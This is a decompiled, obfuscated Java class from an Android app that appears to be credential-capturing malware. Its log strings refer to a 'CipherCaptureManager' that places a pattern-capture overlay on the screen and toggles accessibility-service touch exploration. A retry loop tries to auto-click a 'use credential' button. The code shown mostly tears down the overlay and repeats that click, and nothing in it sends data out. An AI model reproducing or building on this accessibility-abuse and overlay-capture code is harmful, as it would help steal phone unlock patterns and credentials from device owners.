package p000;

import android.accessibilityservice.AccessibilityServiceInfo;
import com.storm.safe.rock.service.modules.cipher.C0335a1;
import com.storm.safe.rock.service.modules.cipher.C0337a3;
import java.util.concurrent.atomic.AtomicBoolean;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: hw */
/* loaded from: classes2.dex */
public final /* synthetic */ class RunnableC0596hw implements Runnable {

    /* renamed from: a0 */
    public final /* synthetic */ int f56757a0;

    /* renamed from: a1 */
    public final /* synthetic */ C0335a1 f56758a1;

    public /* synthetic */ RunnableC0596hw(C0335a1 c0335a1, int i) {
        this.f56757a0 = i;
        this.f56758a1 = c0335a1;
    }

    @Override // java.lang.Runnable
    public final void run() {
        int i = 1;
        switch (this.f56757a0) {
            case 0:
                C0335a1 c0335a1 = this.f56758a1;
                try {
                    C0337a3 c0337a3 = c0335a1.f53289a3;
                    if (c0337a3 != null) {
                        c0337a3.m211848b1(false);
                    }
                    c0335a1.f53289a3 = null;
                    C0337a3.f53343b6.releaseInstance();
                    c0335a1.f53304b8 = false;
                    t60.m214714d6("CipherCaptureManager", "🔷 [tryStartPatternOverlay] 覆盖层已清理，pendingOverlayCreation 已重置");
                    c0335a1.m211818b8();
                    return;
                } catch (Exception e) {
                    tz0.m214807a7("清理覆盖层失败: ", e.getMessage(), "CipherCaptureManager");
                    return;
                }
            case 1:
                C0335a1 c0335a12 = this.f56758a1;
                try {
                    AccessibilityServiceInfo serviceInfo = c0335a12.f53286a0.getServiceInfo();
                    if (serviceInfo == null) {
                        return;
                    }
                    serviceInfo.flags &= -5;
                    c0335a12.f53286a0.setServiceInfo(serviceInfo);
                    t60.m214702c3("CipherCaptureManager", "🔷 触摸探索模式已关闭");
                    return;
                } catch (Exception e2) {
                    tz0.m214807a7("❌ 关闭触摸探索失败: ", e2.getMessage(), "CipherCaptureManager");
                    return;
                }
            case 2:
                C0335a1 c0335a13 = this.f56758a1;
                try {
                    C0337a3 c0337a32 = c0335a13.f53289a3;
                    if (c0337a32 != null) {
                        c0337a32.m211848b1(false);
                    }
                    c0335a13.f53289a3 = null;
                    C0337a3.f53343b6.releaseInstance();
                    t60.m214702c3("CipherCaptureManager", "🔷 已移除图案捕获覆盖层");
                    return;
                } catch (Exception e3) {
                    tz0.m214807a7("移除覆盖层失败: ", e3.getMessage(), "CipherCaptureManager");
                    return;
                }
            case 3:
                C0335a1 c0335a14 = this.f56758a1;
                t60.m214695b6(c0335a14, "this$0");
                try {
                    C0337a3 c0337a33 = c0335a14.f53289a3;
                    if (c0337a33 != null) {
                        sm0 sm0Var = C0337a3.f53343b6;
                        c0337a33.m211848b1(true);
                        c0335a14.f53289a3 = null;
                        C0337a3.f53343b6.releaseInstance();
                        t60.m214702c3("CipherCaptureManager", "🔄 已清理旧的图案捕获状态");
                        return;
                    }
                    return;
                } catch (Exception e4) {
                    tz0.m214807a7("清理旧状态失败: ", e4.getMessage(), "CipherCaptureManager");
                    return;
                }
            case 4:
                C0335a1 c0335a15 = this.f56758a1;
                AtomicBoolean atomicBoolean = c0335a15.f53310c4;
                while (true) {
                    if (i < 6) {
                        try {
                            try {
                                if (c0335a15.m211826e3()) {
                                    atomicBoolean.set(false);
                                } else {
                                    if (i < 5) {
                                        Thread.sleep(200L);
                                    }
                                    i++;
                                }
                            } finally {
                                atomicBoolean.set(false);
                            }
                        } catch (Exception e5) {
                            t60.m214726f4("CipherCaptureManager", "tryClickUseCredentialButton 异常: " + e5.getMessage());
                        }
                    } else {
                        t60.m214702c3("CipherCaptureManager", "🔍 5次重试后仍未找到 button_use_credential（可能当前界面不含此按钮）");
                    }
                }
                return;
            case 5:
                C0335a1 c0335a16 = this.f56758a1;
                try {
                    C0337a3 c0337a34 = c0335a16.f53289a3;
                    if (c0337a34 != null) {
                        c0337a34.m211848b1(false);
                    }
                    c0335a16.f53289a3 = null;
                    C0337a3.f53343b6.releaseInstance();
                    c0335a16.f53304b8 = false;
                    t60.m214714d6("CipherCaptureManager", "🔷 覆盖层已清理，pendingOverlayCreation 已重置");
                    c0335a16.m211818b8();
                    return;
                } catch (Exception e6) {
                    tz0.m214807a7("清理覆盖层失败: ", e6.getMessage(), "CipherCaptureManager");
                    return;
                }
            case 6:
                C0335a1 c0335a17 = this.f56758a1;
                try {
                    C0337a3 c0337a35 = c0335a17.f53289a3;
                    if (c0337a35 != null) {
                        c0337a35.m211848b1(false);
                    }
                    c0335a17.f53289a3 = null;
                    C0337a3.f53343b6.releaseInstance();
                    c0335a17.f53304b8 = false;
                    c0335a17.m211818b8();
                    return;
                } catch (Exception e7) {
                    tz0.m214807a7("清理覆盖层失败: ", e7.getMessage(), "CipherCaptureManager");
                    return;
                }
            case 7:
                C0335a1 c0335a18 = this.f56758a1;
                try {
                    C0337a3 c0337a36 = c0335a18.f53289a3;
                    if (c0337a36 != null) {
                        c0337a36.m211848b1(false);
                    }
                    c0335a18.f53289a3 = null;
                    C0337a3.f53343b6.releaseInstance();
                    c0335a18.f53304b8 = false;
                    t60.m214714d6("CipherCaptureManager", "🔷 覆盖层已清理");
                    c0335a18.m211818b8();
                    return;
                } catch (Exception e8) {
                    tz0.m214807a7("清理覆盖层失败: ", e8.getMessage(), "CipherCaptureManager");
                    return;
                }
            default:
                C0335a1 c0335a19 = this.f56758a1;
                try {
                    C0337a3 c0337a37 = c0335a19.f53289a3;
                    if (c0337a37 != null) {
                        c0337a37.m211848b1(false);
                    }
                    c0335a19.f53289a3 = null;
                    C0337a3.f53343b6.releaseInstance();
                    c0335a19.f53304b8 = false;
                    t60.m214714d6("CipherCaptureManager", "🔷 [OverlayWatcher] 覆盖层已清理");
                    c0335a19.m211818b8();
                    return;
                } catch (Exception e9) {
                    tz0.m214807a7("[OverlayWatcher] 清理失败: ", e9.getMessage(), "CipherCaptureManager");
                    return;
                }
        }
    }
}
